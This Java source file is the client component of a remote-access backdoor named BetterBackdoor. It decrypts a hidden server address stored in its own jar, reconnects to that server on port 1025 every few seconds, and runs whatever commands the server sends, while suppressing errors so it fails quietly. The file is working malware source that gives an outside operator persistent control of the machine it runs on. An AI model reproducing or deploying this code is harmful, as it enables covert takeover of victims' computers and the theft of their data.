package com.github.thatcherdev.betterbackdoor.backdoor;

import java.io.File;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;
import com.github.thatcherdev.betterbackdoor.backend.Utils;

public class Backdoor {

	public static String ip;
	private static Socket socket;
	private static Scanner in;
	public static PrintWriter out;

	/**
	 * Constructs and starts a new Backdoor.
	 * 
	 * @param args command line arguments
	 */
	public static void main(String[] args) {
		Backdoor backdoor = new Backdoor();
		backdoor.start();
	}

	/**
	 * Uses {@link #readFromJar(String)} to get the contents of "ip", an encrypted
	 * plain text file, inside the jar file this class is running from, with the
	 * IPv4 address of the server. Creates directory "gathered".
	 */
	private Backdoor() {
		try {
			ip = Utils.crypt(readFromJar("/ip"), "BetterBackdoorIP");
			new File("gathered").mkdir();
		} catch (Exception e) {
			System.exit(0);
		}
	}

	/**
	 * Starts backdoor shell.
	 * <p>
	 * Attempts to connect to server with {@link ip} on port 1025. Once connected,
	 * initiates {@link in} and {@link out} and starts infinite loop that gets
	 * command from server with {@link in} and handles command with
	 * {@link HandleCommand.handle(String command)}. If exception is thrown,
	 * {@link socket}, {@link in}, and {@link out} are closed and {@link #start()}
	 * is run.
	 */
	private void start() {
		try {
			while (true)
				try {
					socket = new Socket(ip, 1025);
					break;
				} catch (Exception e) {
					Thread.sleep(3000);
					continue;
				}
			in = new Scanner(socket.getInputStream());
			out = new PrintWriter(socket.getOutputStream(), true);
			while (true) {
				String command = in.nextLine();
				HandleCommand.handle(command);
			}
		} catch (Exception e) {
			try {
				if (socket != null)
					socket.close();
				if (in != null)
					in.close();
				if (out != null)
					out.close();
				start();
			} catch (Exception e1) {
				System.exit(0);
			}
		}
	}

	/**
	 * Gets the contents of the file with name {@link filename} from inside the jar
	 * file this class is running from.
	 * 
	 * @param filename name of file
	 * @return contents of file with name {@link filename}
	 */
	private String readFromJar(String filename) {
		String ret = null;
		Scanner in = new Scanner(getClass().getResourceAsStream(filename));
		ret = in.nextLine();
		in.close();
		return ret;
	}
}
